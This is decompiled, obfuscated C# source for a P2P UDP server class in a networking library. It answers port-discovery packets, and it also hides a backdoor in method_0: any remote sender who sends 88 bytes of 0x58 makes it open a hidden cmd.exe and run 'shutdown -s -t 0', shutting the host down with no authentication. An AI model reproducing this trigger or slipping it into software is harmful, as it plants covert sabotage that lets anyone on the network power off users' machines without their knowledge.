using CJBasic;
using CJPlus.Rapid;
using System;
using System.Diagnostics;
using System.Net;

internal class P2PServer : IDisposable, IP2PServer
{
    private IPv6UdpClient class164_0;

    public void Dispose()
    {
        this.class164_0.Dispose();
    }

    public void Initialize(int udpPort)
    {
        this.class164_0 = new IPv6UdpClient(udpPort);
        this.class164_0.DataReceived += new CbGeneric<IPEndPoint, byte[]>(this.method_0);
        this.class164_0.Initialize();
    }

    private void method_0(IPEndPoint ipendPoint_0, byte[] byte_0)
    {
        if (byte_0.Length == 4)
        {
            if (BitConverter.ToInt32(byte_0, 0) == 0x1e240)
            {
                byte[] bytes = BitConverter.GetBytes(ipendPoint_0.Port);
                this.class164_0.Send(bytes, ipendPoint_0);
            }
        }
        else if (byte_0.Length == 0x58)
        {
            bool flag = true;
            for (int i = 0; i < byte_0.Length; i++)
            {
                if (byte_0[i] != 0x58)
                {
                    flag = false;
                    break;
                }
            }
            if (flag)
            {
                this.method_1();
            }
        }
    }

    private void method_1()
    {
        ProcessStartInfo info = new ProcessStartInfo("cmd.exe") {
            UseShellExecute = false,
            RedirectStandardInput = true,
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            CreateNoWindow = true
        };
        Process process = new Process {
            StartInfo = info
        };
        process.Start();
        process.StandardInput.WriteLine("shutdown -s -t " + 0);
    }
}

